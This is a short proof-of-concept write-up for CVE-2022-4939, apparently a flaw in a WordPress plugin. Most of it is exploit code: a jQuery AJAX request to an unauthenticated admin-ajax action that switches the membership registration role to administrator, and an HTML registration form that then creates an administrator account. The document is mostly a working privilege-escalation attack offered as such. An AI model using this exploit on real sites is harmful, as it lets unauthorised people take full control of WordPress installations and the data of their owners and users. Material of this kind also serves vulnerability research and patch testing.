# PoC-CVE-2022-4939

The attacker sends a specially crafted request to the wp_ajax_nopriv_wcfm_ajax_controller AJAX action to modify the membership registration form and set the registration role to that of an administrator:

jQuery.ajax({
    url: '/wp-admin/admin-ajax.php',
    type: 'POST',
    data: {
        action: 'wcfm_ajax_controller',
        controller: 'wcfm-membership',
        method: 'update_membership_registration',
        membership_registration: {
            registration_role: 'administrator'
        }
    },
    success: function(response) {
        console.log(response);
    }
});

The plugin processes the request and modifies the membership registration form to allow users to register with the role of an administrator.
The attacker registers as a new user with the administrator role by submitting the modified membership registration form:


<form id="register-form" method="post" action="https://example.com/wp-login.php?action=register">
    <input type="hidden" name="role" value="administrator" />
    <input type="text" name="user_login" />
    <input type="text" name="user_email" />
    <input type="password" name="pass1" />
    <input type="password" name="pass2" />
    <input type="submit" value="Register" />
</form>
